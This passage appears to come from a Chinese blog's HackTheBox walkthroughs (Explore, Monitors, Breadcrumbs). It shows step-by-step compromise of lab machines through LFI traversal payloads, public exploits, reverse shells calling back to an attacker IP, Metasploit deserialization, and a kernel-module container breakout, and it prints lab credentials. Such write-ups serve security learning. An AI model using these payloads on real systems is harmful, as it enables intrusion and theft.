.php,.html\n\n        /'___\\  /'___\\           /'___\\\n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/\n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\\n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/\n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\\n          \\/_/    \\/_/   \\/___/    \\/_/\n\n       v1.3.1 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://10.10.10.247:59777/FUZZ\n :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt\n :: Extensions       : .php .html\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 100\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405\n________________________________________________\n\nacct                    [Status: 301, Size: 65, Words: 3, Lines: 1]\nbin                     [Status: 301, Size: 63, Words: 3, Lines: 1]\ncache                   [Status: 301, Size: 67, Words: 3, Lines: 1]\nconfig                  [Status: 301, Size: 69, Words: 3, Lines: 1]\nd                       [Status: 301, Size: 59, Words: 3, Lines: 1]\ndata                    [Status: 301, Size: 65, Words: 3, Lines: 1]\ndev                     [Status: 301, Size: 63, Words: 3, Lines: 1]\netc                     [Status: 301, Size: 63, Words: 3, Lines: 1]\ninit                    [Status: 403, Size: 31, Words: 4, Lines: 1]\nlib                     [Status: 301, Size: 63, Words: 3, Lines: 1]\nmnt                     [Status: 301, Size: 63, Words: 3, Lines: 1]\noem                     [Status: 301, Size: 63, Words: 3, Lines: 1]\nproc                    [Status: 301, Size: 65, Words: 3, Lines: 1]\nproduct                 [Status: 301, Size: 71, Words: 3, Lines: 1]\nsbin                    [Status: 301, Size: 65, Words: 3, Lines: 1]\nstorage                 [Status: 301, Size: 71, Words: 3, Lines: 1]\nsys                     [Status: 301, Size: 63, Words: 3, Lines: 1]\nsystem                  [Status: 301, Size: 69, Words: 3, Lines: 1]\nvendor                  [Status: 301, Size: 69, Words: 3, Lines: 1]\n:: Progress: [61407/61407] :: Job [1/1] :: 199 req/sec :: Duration: [0:05:35] :: Errors: 0 ::\n```\n看到这个目录结构，我感觉这HTTP服务是运行在根目录下的\n\n然后我又去看了一下这台靶机的系统，Android系统，咱们去查找一下Android的敏感文件试试。\n\n![](Hackthebox-Explore/8d721628-8cd8-4c95-8bdb-4933224713f4.jpg)\n\n经过确认，确实是存在文件读取的漏洞，但我不太了解Android，那应该怎么办呢？简单！摇人儿！在询问玩Android的朋友怎么搞以后，又经过大量的资料查找以及fuzz以后，得到了答案\n\n![](Hackthebox-Explore/b8d2aa7e-6283-4e34-bfa3-7da3c5b0cefe.jpg)\n\n![](Hackthebox-Explore/d2267a43-121d-45cd-91a2-255ec847b09e.jpg)\n\n这里/sdcard/提示\n\n```Plain Text\nNo directory listing.\n```\n，但/sdcard1/提示\n\n```Plain Text\n404 file not found.\n```\n那么，这里就可以确定，/sdcard/这个目录是存在的了，咱们继续往下做\n\n## 漏洞利用\n在我愚蠢的对`50777`端口的`Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older`进行了大量的搜索以后，我才看到一个关键词`Minecraft`，我丢，这不就是我的世界服务器吗？放弃\n\n然后把眼光放在了\n\n```Plain Text\n42134\n```\n端口上的\n\n```Plain Text\nES File Explorer Name Response httpd\n```\n上\n\n![](Hackthebox-Explore/ac92812a-83b5-4d0a-b2eb-83bc613f79c4.jpg)\n\n好家伙，这直接就找到了一个exploit >https://www.exploit-db.com/exploits/50070 该exploit提供了不少可执行命令\n\n```Plain Text\ncmds = ['listFiles','listPics','listVideos','listAudios','listApps','listAppsSystem','listAppsPhone','listAppsSdcard','listAppsAll','getFile','getDeviceInfo']\n```\n使用exploit提供listPics指令获取一些图片文件\n\n```Plain Text\npython3 exploit.py listPics 10.10.10.247\n```\n![](Hackthebox-Explore/73253b24-2da7-4b1e-b4cd-df72a16d342d.jpg)\n\n最终在\n\n```Plain Text\nhttp://10.10.10.247:59777/storage/emulated/0/DCIM/creds.jpg\n```\n下找到了一个账号密码\n\n![](Hackthebox-Explore/721c9263-8974-4799-a15d-e7db137a0f18.jpg)\n\n```Plain Text\nusername = kristi\npassword = Kr1sT!5h@Rp3xPl0r3!\n```\n咱们使用ssh进行登录\n\n```Plain Text\nssh kristi@10.10.10.247 -p 2222\n```\n![](Hackthebox-Explore/3bdc2af2-d557-4578-ab12-2d535df10159.jpg)\n\n成功拿到shell，咱们找找看文件\n\n![](Hackthebox-Explore/d6408300-733e-40f7-adf9-aac6dac19e38.jpg)\n\n在\n\n```Plain Text\n/sdcard/\n```\n目录下找到了\n\n```Plain Text\nuser.txt\n```\n文件，成功拿到user权限的flag，同时想到，咱们是否可直接利用\n\n```Plain Text\n59777\n```\n端口利用文件读取直接读取到该flag呢？\n\n```Plain Text\nhttp://10.10.10.247:59777/sdcard/user.txt\n```\n![](Hackthebox-Explore/15fd860d-2cf5-4947-9024-f7f8e5c53439.jpg)\n\n事实证明，是可以的\n\n## 权限提升\n咱们目前没利用过且无法直接利用的端口只有5555端口了，我估计突破口在这上面，咱们先使用ssh给它转发出来吧\n\n```Plain Text\nssh -L 5555:127.0.0.1:5555 kristi@10.10.10.247 -p 2222 -N -v -v\n```\n代理上以后，咱们来分析一下啊。\n\n既然这台Android连接着sd卡，那么应该是开启着ADB调试桥的，也就是说咱们或许可以直接使用ADB进行破解。\n\n说来也巧，这个技巧还是我之前闲着没事儿研究破解Android密码的时候恰巧看到的。\n\n```Plain Text\nadb connect 127.0.0.1:5555\n```\n连接成功后，使用\n\n```Plain Text\nadb -s 127.0.0.1:5555 shell\n```\n登入shell\n\n![](Hackthebox-Explore/39478aaf-9b8f-414a-9f39-ab798ee6f251.jpg)\n\n成功获得root权限\n\n使用`find / -name root.txt`指令，成功获得root文件位置`/data/root.txt`\n\n![](Hackthebox-Explore/b061c4b6-f22a-479c-9c56-b7c9c4b3b5a8.jpg)\n\n成功拿到root权限的flag文件","tags":["Hackthebox"]},{"title":"Monitors - Hackthebox","url":"/2021/06/24/Hackthebox/Hard/Hackthebox-Monitors/","content":"\n# Hackthebox - Monitors\n# **靶场信息**\n![](Hackthebox-Monitors/448916e6-78fb-4ed3-8caa-f96b8eb52e32.png)\n\n# **靶场类型**\n![](Hackthebox-Monitors/7d23f011-68e1-48c6-98ea-0700663601ec.png)\n\n# **信息搜集**\n## Nmap\n首先使用nmap进行信息搜集\n\n```bash\nnmap -A -sS -sC -sV 10.10.10.238\n```\n```bash\n┌──(root💀root)-[~/Desktop]\n└─# nmap -A -sS -sC -sV 10.10.10.238\n\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-06-25 03:09 CST\nNmap scan report for 10.10.10.238\nHost is up (0.24s latency).\nNot shown: 998 closed ports\nPORT STATE SERVICE VERSION\n22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n| 2048 ba:cc:cd:81:fc:91:55:f3:f6:a9:1f:4e:e8:be:e5:2e (RSA)\n| 256 69:43:37:6a:18:09:f5:e7:7a:67:b8:18:11:ea:d7:65 (ECDSA)\n|_ 256 5d:5e:3f:67:ef:7d:76:23:15:11:4b:53:f8:41:3a:94 (ED25519)\n80/tcp open http Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Site doesn't have a title (text/html; charset=iso-8859-1).\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=6/25%OT=22%CT=1%CU=35010%PV=Y%DS=2%DC=T%G=Y%TM=60D4D89\nOS:3%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS\nOS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1\nOS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN\nOS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A\nOS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R\nOS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F\nOS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%\nOS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD\nOS:=S)\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\nTRACEROUTE (using port 1025/tcp)\nHOP RTT ADDRESS\n1 239.07 ms 10.10.14.1\n2 239.14 ms 10.10.10.238\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 32.56 seconds\n```\n我们可以看到，开启了22和80端口，咱们先去80端口看看\n\n## Http\n![](Hackthebox-Monitors/8ffddb27-0550-4446-b71b-af8cddd58352.png)\n\n不允许使用IP进行访问，那咱们先添加一下hosts吧\n\n```bash\necho 10.10.10.238 monitors.htb > /etc/hosts\n```\n![](Hackthebox-Monitors/84ee98fa-49b9-4a8d-87e5-1247f355d849.png)\n\n然后访问monitors.htb，我们把目光放在右下角Powered by Wordpress\n\n这很明显的是wordpress啊，使用wpscan扫描看看\n\n```bash\nwpscan --url http://monitors.htb/ -e p,t,u\n```\n![](Hackthebox-Monitors/e1542669-e868-4c29-8d08-61a8a8372aba.png)\n\n咱们把目光放在这一行wp-with-spritz\n\n![](Hackthebox-Monitors/45b1fc2d-e38b-42db-86f0-1c3badd3ba53.png)\n\n找到了一个exp，咱们进去看看\n\n> [https://www.exploit-db.com/exploits/44544](https://www.exploit-db.com/exploits/44544)\n\n# **漏洞利用**\n```bash\n1. Version Disclosure\n/wp-content/plugins/wp-with-spritz/readme.txt\n\n2. Source Code\nif(isset($_GET['url'])){\n$content=file_get_contents($_GET['url']);\n\n3. Proof of Concept\n/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd\n/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=http(s)://domain/exec\n```\n根据这个exploit给出的验证，咱们试试是否可用\n\n```bash\n[http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd](http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd)\n```\n成功获取/etc/passwd文件\n\n![](Hackthebox-Monitors/9b50b428-4156-45e0-8d3c-c42c0b6a7268.png)\n\n然后只是一个Wordpress的站点，咱们直接试试是否可以查看它的配置文件\n\n```bash\nhttp://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/var/www/wordpress/wp-config.php\n```\n![](Hackthebox-Monitors/3b1ec4a0-8f83-4450-ba19-e0bf171ccc18.png)\n\n成功获得数据库账户密码\n\n```bash\nDB_NAME = “wordpress”\nDB_USER = “wpadmin”\nDB_PASSWORD = “BestAdministrator@2020!”\n```\n该账户不存在于/etc/passwd内，所以应该是无法直接使用ssh进行登录的，咱们想想有没有其他办法进行getshell\n\n![](Hackthebox-Monitors/3c81bbe9-5d17-41dd-b34b-34ac4215e66e.png)\n\n尝试使用该账户登录后台，也不可行，好家伙这是逼我动真格了？\n\n我找到了一篇LFI转RCE的文章\n\n> https://infosecwriteups.com/bugbounty-journey-from-lfi-to-rce-how-a69afe5a0899\n\n咱们抓个包吧\n\n![](Hackthebox-Monitors/f3580c24-5079-4342-801c-3fe8d476cca0.png)\n\n![](Hackthebox-Monitors/8ee0c557-5794-448e-948c-6d19270d7234.png)\n\n抓包后将我们自己自定义的1设置为爆破点，然后选择Numbers，设置从1到15\n\n正常来说是会看到一个比较大的包的，但我这里不知道为什么没有，所以我通过其他方式(FUZZ)跑出来了\n\n```bash\n[http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../../etc/apache2/sites-available/000-default.conf](http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../../etc/apache2/sites-available/000-default.conf)\n```\n![](Hackthebox-Monitors/18fa0d8a-cabf-4be0-bb67-cf7ca0bf2733.png)\n\n然后咱们获得了另一个域名\n\ncacti-admin.monitors.htb，咱们添加进hosts\n\n```bash\necho 10.10.10.238 cacti-admin.monitors.htb >> /etc/hosts\n```\n然后咱们访问一下[http://cacti-admin.monitors.htb/](http://cacti-admin.monitors.htb/)\n\n![](Hackthebox-Monitors/cd8d7411-2fdb-41ee-8f54-50367629e98d.png)\n\n这个仙人掌界面，我估计我们之前读取到的账号密码可以起作用了\n\n用户名：admin\n\n密码：BestAdministrator@2020!\n\n![](Hackthebox-Monitors/9b99eb19-688f-4b0e-9619-c515a416a944.png)\n\n可总算是登录进后台了\n\n![](Hackthebox-Monitors/20d52fb9-1658-4681-a827-910d9193319d.png)\n\n让我们点一下这个仙人掌检查一下版本\n\n![](Hackthebox-Monitors/49a83570-a8d3-421b-a9b2-527de6e4a617.png)\n\n版本1.2.12\n\n![](Hackthebox-Monitors/d0ab04e5-ffcc-4a08-8ffd-60dcbe9ac6d9.png)\n\n在github上找到了一个相关的问题\n\n漏洞编号 CVE-2020-14295\n\n这里是确定存在一个注入漏洞，让我们来尝试一下\n\n使用该exploit\n\n> [https://www.exploit-db.com/exploits/49810](https://www.exploit-db.com/exploits/49810)\n\n看看是否可以直接获得一个shell\n\n```bash\npython3 exploit.py -t http://cacti-admin.monitors.htb -u admin -p \"BestAdministrator@2020\\!\" --lhost 10.10.14.163 --lport 4444\n```\ntips:此处密码的感叹号要用反斜杠进行转义，不然会被编译掉\n\n![](Hackthebox-Monitors/636aa853-e834-4487-bb44-3b7db7abcd70.png)\n\n![](Hackthebox-Monitors/08a8b82b-8515-40a1-be7d-c975b0ecf363.png)\n\n成功获得一个shell\n\n可以使用python3 -c \"import pty;pty.spawn('/bin/bash')\";获取一个更加稳定的shell\n\n# **权限提升**\n![](Hackthebox-Monitors/b59d0937-aa7a-475a-afc4-971cd3513bb1.png)\n\n咱们可以看到，只有marcus的目录咱们可以看到，所以咱们肯定是要获取这个用户的权限了\n\n```bash\ngrep 'marcus' /etc -R 2>/dev/null\n```\n咱们查找一下相关的文件\n\n![](Hackthebox-Monitors/78452e90-55e9-4a15-87c1-066f5d4d8e12.png)\n\n咱们找到一个脚本\n\n```bash\n/home/marcus/.backup/backup.sh\n```\n查看一下\n\n![](Hackthebox-Monitors/cd22e91f-5da5-4bd8-855d-852849b6a858.png)\n\n咱们获得了一个密码\n\n```bash\nVerticalEdge2020\n```\n应该是marcus用户的密码，咱们去使用ssh登录试试\n\n```bash\nssh [marcus@10.10.10.238](mailto:marcus@10.10.10.238)\n```\n![](Hackthebox-Monitors/a6b0100d-1464-4c6c-8b90-00417cfab93e.png)\n\n登录成功\n\n![](Hackthebox-Monitors/495e7f62-7e19-492f-8a33-6808eaaa313d.png)\n\n成功获得user权限的flag\n\n咱们查看一下note.txt文件\n\n![](Hackthebox-Monitors/83a8630e-2de7-41dc-ada8-7745f033e9d6.png)\n\n这个提示提到了docker，那咱们去查看一下docker吧\n\nps aux|grep docker\n\n![](Hackthebox-Monitors/17860965-cb90-4cd7-86c2-d9221bfda1b7.png)\n\n我看到一个使用 docker-proxy 运行的 docker 容器。所以我搜索了一些关于 dokcer-proxy 的信息\n\n我找到的参考文本\n\n> [https://docs.docker.com/network/proxy/](https://docs.docker.com/network/proxy/)\n\n阅读文本后，知道了使用docker-proxy可以通过代理运行docker容器。\n\n知道这个信息后，让我们看看是否有无法从外部访问的端口运行着\n\n```bash\nnetstat -an\n```\n![](Hackthebox-Monitors/4fd619b1-ee7f-484c-98ca-7fe529f2e472.png)\n\n有一个8443端口\n\n这应该就是docker-proxy正在侦听的端口了，我们使用ssh创建一个代理隧道\n\n```bash\nssh -L 8443:127.0.0.1:8443 [marcus@10.10.10.238](mailto:marcus@10.10.10.238)\n```\n![](Hackthebox-Monitors/7bf1d374-d52c-4dcf-bd33-fcf3456c1241.png)\n\n然后咱们去访问[https://127.0.0.1:8443](https://127.0.0.1:8443/)\n\n![](Hackthebox-Monitors/47f6404c-7c58-4e29-90b4-86c1a231c536.png)\n\n会看到有一个tomcat服务器\n\n尝试在Google查找漏洞后，经过努力找到了一个Java 反序列化\n\n> [https://www.rapid7.com/db/modules/exploit/linux/http/apache\\_ofbiz\\_deserialization/](https://www.rapid7.com/db/modules/exploit/linux/http/apache_ofbiz_deserialization/)\n\n如上所述，我将使用msf直接进行攻击\n\n```bash\nmsfconsole启动msf\nexploit/linux/http/apache_ofbiz_deserialization\nset rhosts 127.0.0.1\nset lhost 10.10.14.163\nset lport 5555\nset ForceExploit true\nexploit\n```\n![](Hackthebox-Monitors/e82b6c37-75cc-4570-a263-49329aeedcc9.png)\n\n咱们成功利用反序列化漏洞以root权限在docker上获得了一个shell\n\n输入shell进入权限\n\n输入capsh --print查看容器的功能\n\n![](Hackthebox-Monitors/050754f0-6dca-4c45-845d-65d397fca9d8.png)\n\n你们猜猜我发现了啥？\n\ndocker具有SYS\\_MODULE权限。因此，容器可以在docker主机的内核中插入/删除内核模块\n\n然后我搜索了 docker sys\\_module 的漏洞，还真找到了\n\n> [https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd?gi=c12387585c2](https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd?gi=c12387585c2)\n\n根据文章提示，我制作了两个脚本\n\n![](Hackthebox-Monitors/69510738-7fcc-41f0-9ccc-2e864e10acfe.png)\n\n记得修改IP地址和端口，我这里忘记修改了\n\n然后把脚本上传到docker里\n\n```bash\npython -c \"import pty;pty.spawn('/bin/bash')\";\n```\n首先使用python获得一个稳定的shell\n\n然后进入/root目录\n\n![](Hackthebox-Monitors/e55fadc6-fb2d-43b7-92f8-2576ab004146.png)\n\n在本地开启一个http服务器\n\n然后使用wget下载两个脚本\n\n![](Hackthebox-Monitors/5d88a727-941b-441c-a79d-8735ce6ce821.png)\n\n输入make all\n\n![](Hackthebox-Monitors/53721ed2-33c5-4546-91e1-dba8d2d1e6f1.png)\n\n输出了很多的文件，但我们只需要reverse-shell.ko\n\n首先我们使用nc监听一个端口\n\n```bash\nnc -nvlp 4444\n```\n然后使用insmod reverse-shell.ko运行我们要的文件\n\n![](Hackthebox-Monitors/7227cc74-0f62-4bee-baa4-587bfda77351.png)\n\n成功提权到root\n\n![](Hackthebox-Monitors/31f2739d-d6ee-4dbe-9558-9deabe3ea1a4.png)\n\n成功获得root权限的flag\n\n收工睡觉\n\n这几天没有更新，是因为被某厂恶心了一把，让我自我怀疑了一下以为我自己真的很菜。\n\n但经过我时候以后发现，其实我更菜！\n\n没想到吧，哎嘿\n\n发现我自己更菜以后，我就可以放心的睡觉了，大家晚安","tags":["Hackthebox"]},{"title":"Breadcrumbs - Hackthebox","url":"/2021/06/19/Hackthebox/Hard/Hackthebox-Breadcrumbs/","content":"\n# Hackthebox - Breadcrumbs\n# **靶场信息**\n![](Hackthebox-Breadcrumbs/52c6e1e5-c429-4907-bb22-2e74f3543e76.png)\n\n# **靶场类型**\n![](Hackthebox-Breadcrumbs/fe9be17b-7d8c-46ec-9094-d13ffef02788.png)\n\n# **信息搜集**\n## Nmap\n使用nmap进行端口扫描\n\n```cpp\nnmap -A -sS -sC -sV 10.10.10.228\n```\n```cpp\n┌──(root💀root)-[~/Desktop]\n└─# nmap -A -sS -sC -sV 10.10.10.228\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-06-19 13:47 CST\nNmap scan report for 10.10.10.228\nHost is up (0.25s latency).\nNot shown: 993 closed ports\nPORT STATE SERVICE VERSION\n22/tcp open ssh OpenSSH for_Windows_7.7 (protocol 2.0)\n| ssh-hostkey:\n| 2048 9d:d0:b8:81:55:54:ea:0f:89:b1:10:32:33:6a:a7:8f (RSA)\n| 256 1f:2e:67:37:1a:b8:91:1d:5c:31:59:c7:c6:df:14:1d (ECDSA)\n|_ 256 30:9e:5d:12:e3:c6:b7:c6:3b:7e:1e:e7:89:7e:83:e4 (ED25519)\n80/tcp open http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)\n| http-cookie-flags:\n| /:\n| PHPSESSID:\n|_ httponly flag not set\n|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1\n|_http-title: Library\n135/tcp open msrpc Microsoft Windows RPC\n139/tcp open netbios-ssn Microsoft Windows netbios-ssn\n443/tcp open ssl/http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)\n| http-cookie-flags:\n| /:\n| PHPSESSID:\n|_ httponly flag not set\n|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1\n|_http-title: Library\n| ssl-cert: Subject: commonName=localhost\n| Not valid before: 2009-11-10T23:48:47\n|_Not valid after: 2019-11-08T23:48:47\n|_ssl-date: TLS randomness does not represent time\n| tls-alpn:\n|_ http/1.1\n445/tcp open microsoft-ds?\n3306/tcp open mysql?\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=6/19%OT=22%CT=1%CU=39016%PV=Y%DS=2%DC=T%G=Y%TM=60CD853\nOS:0%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10C%TI=I%CI=I%II=I%SS=S%TS=\nOS:U)OPS(O1=M54DNW8NNS%O2=M54DNW8NNS%O3=M54DNW8%O4=M54DNW8NNS%O5=M54DNW8NNS\nOS:%O6=M54DNNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%\nOS:DF=Y%T=80%W=FFFF%O=M54DNW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=\nOS:0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S\nOS:=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=\nOS:Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=\nOS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T\nOS:=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=\nOS:Z)\nNetwork Distance: 2 hops\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\nHost script results:\n|_clock-skew: 11m52s\n| smb2-security-mode:\n| 2.02:\n|_ Message signing enabled but not required\n| smb2-time:\n| date: 2021-06-19T06:00:15\n|_ start_date: N/A\nTRACEROUTE (using port 53/tcp)\nHOP RTT ADDRESS\n1 248.74 ms 10.10.14.1\n2 248.83 ms 10.10.10.228\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 59.03 seconds\n```\n可以看到，该靶机开启了22、80、135、139、443、445、3306端口\n\n咱们访问一下80端口\n\n## Http\n![](Hackthebox-Breadcrumbs/0c44ebc9-2d5a-4e9c-826d-8d157e58289c.png)\n\n点击check books看看\n\n![](Hackthebox-Breadcrumbs/91ed5a94-ca42-4ba8-9b0f-79b561b540cf.png)\n\n查找图书，咱们随便查找一个\n\n![](Hackthebox-Breadcrumbs/1db3f872-a271-4883-88fc-698438ba9e7f.png)\n\n![](Hackthebox-Breadcrumbs/3b5ef4b7-fe1b-4869-9e7f-265995871b6f.png)\n\n咱们拦截一个包看看\n\n![](Hackthebox-Breadcrumbs/ad7b8f75-0e74-4598-aec3-f068f1e3b7f6.png)\n\n看到有个参数book，是读取网页的，那是否存在LFI（本地文件包含）呢？测试一下\n\n![](Hackthebox-Breadcrumbs/41d28654-7825-451b-ad8a-4a7246297a72.png)\n\n我们可以看到，提示的是没有这个文件，也就是说，确实存在LFI\n\n只不过咱们要访问的页面在上级目录里而已，咱们测试一下\n\n![](Hackthebox-Breadcrumbs/d80ea596-7693-40b9-972a-292d73beaad2.png)\n\n# **漏洞利用**\nnice，该漏洞确实是存在的，并且可以利用\n\n由于这是一台windows的机器，咱们查看一下他自身存在的一些文件\n\n```cpp\n../../../../../../WINDOWS/system32/drivers/etc/hosts\n```\n![](Hackthebox-Breadcrumbs/10a5ca60-30ff-44da-9965-be1aa9d17a5e.png)\n\n```cpp\n\"# Copyright (c) 1993-2009 Microsoft Corp.\\r\\n#\\r\\n# This is a sample HOSTS file used by Microsoft TCP\\/IP for Windows.\\r\\n#\\r\\n# This file contains the mappings of IP addresses to host names. Each\\r\\n# entry should be kept on an individual line. The IP address should\\r\\n# be placed in the first column followed by the corresponding host name.\\r\\n# The IP address and the host name should be separated by at least one\\r\\n# space.\\r\\n#\\r\\n# Additionally, comments (such as these) may be inserted on individual\\r\\n# lines or following the machine name denoted by a '#' symbol.\\r\\n#\\r\\n# For example:\\r\\n#\\r\\n# 102.54.94.97 rhino.acme.com # source server\\r\\n# 38.25.63.10 x.acme.com # x client host\\r\\n\\r\\n# localhost name resolution is handled within DNS itself.\\r\\n#\\t127.0.0.1 localhost\\r\\n#\\t::1 localhost\\r\\n\"\n```\n我们之前从错误中看到了关于bookController.php所以让我们尝试读取文件\n\n```cpp\n../../../../../../Users/www-data/Desktop/xampp/htdocs/includes/bookController.php\n```\n![](Hackthebox-Breadcrumbs/d0dc533d-0bbe-4544-8794-45564041fb64.png)\n\n```cpp\n\"<?php\\r\\n\\r\\nif($_SERVER['REQUEST_METHOD'] == \\\"POST\\\"){\\r\\n $out = \\\"\\\";\\r\\n require '..\\/db\\/db.php';\\r\\n\\r\\n $title = \\\"\\\";\\r\\n $author = \\\"\\\";\\r\\n\\r\\n if($_POST['method'] == 0){\\r\\n if($_POST['title'] != \\\"\\\"){\\r\\n $title = \\\"%\\\".$_POST['title'].\\\"%\\\";\\r\\n }\\r\\n if($_POST['author'] != \\\"\\\"){\\r\\n $author = \\\"%\\\".$_POST['author'].\\\"%\\\";\\r\\n }\\r\\n \\r\\n \\r\\n $query = \\\"SELECT * FROM books WHERE title LIKE ? OR author LIKE ?\\\";\\r\\n $stmt = $con->prepare($query);\\r\\n $stmt->bind_param('ss', $title, $author);\\r\\n $stmt->execute();\\r\\n $res = $stmt->get_result();\\r\\n $out = mysqli_fetch_all($res,MYSQLI_ASSOC);\\r\\n }\\r\\n\\r\\n elseif($_POST['method'] == 1){\\r\\n $out = file_get_contents('..\\/books\\/'.$_POST['book']);\\r\\n }\\r\\n\\r\\n else{\\r\\n $out = false;\\r\\n }\\r\\n\\r\\n echo json_encode($out);\\r\\n}\"\n```\n这时候线索又指向了\\$out = \"\";\\\\r\\\\n require '../db/db.php\n\n咱们去查看一下db.php文件\n\n```cpp\n../../../../../../Users/www-data/Desktop/xampp/htdocs/db/db.php\n```\n![](Hackthebox-Breadcrumbs/2b3097a9-cef7-4b5c-a3cd-9f82bc00acbf.png)\n\n```cpp\n\"<?php\\r\\n\\r\\n$host=\\\"localhost\\\";\\r\\n$port=3306;\\r\\n$user=\\\"bread\\\";\\r\\n$password=\\\"jUli901\\\";\\r\\n$dbname=\\\"bread\\\";\\r\\n\\r\\n$con = new mysqli($host, $user, $password, $dbname, $port) or die ('Could not connect to the database server' . mysqli_connect_error());\\r\\n?>\\r\\n\"\n```\n成功得到了3306端口的账号密码\n\n```cpp\nusername = bread\npassword = jUli901\n```\n咱们尝试登录到mysql\n\n![](Hackthebox-Breadcrumbs/d5afa7bf-eb09-4436-af09-02861f771fe2.png)\n\n提示失败\n\n咱们换个思路，读取他的login页面，审计一下登录逻辑\n\n```cpp\n../portal/login.php\n```\n![](Hackthebox-Breadcrumbs/43d19e87-34aa-4c2e-a1ce-39bcaa158388.png)\n\n咱们给他复制出来审计一下\n\n![](Hackthebox-Breadcrumbs/a4170031-69e7-4bfd-a1e1-d73231400c84.png)\n\n咱们发现它正在使用authController.php文件，咱们继续追踪过去看看\n\n![](Hackthebox-Breadcrumbs/44803c4c-843f-43ba-a03a-1b7538ab9cea.png)\n\n咱们看到它有使用一段key，咱们复制出来看看\n\n```cpp\n$secret_key = '6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e'\n```\n咱们还能看到，它有使用一个JWT令牌，这个之前咱们用到过的\n\n同时还调用了一个cookie.php页面，咱们继续追踪看看\n\n![](Hackthebox-Breadcrumbs/1d036af7-380f-415e-a33b-fafc464698ac.png)\n\n```cpp\n\"<?php\\r\\n\\/**\\r\\n * @param string $username Username requesting session cookie\\r\\n * \\r\\n * @return string $session_cookie Returns the generated cookie\\r\\n * \\r\\n * @devteam\\r\\n * Please DO NOT use default PHPSESSID; our security team says they are predictable.\\r\\n * CHANGE SECOND PART OF MD5 KEY EVERY WEEK\\r\\n * *\\/\\r\\nfunction makesession($username){\\r\\n 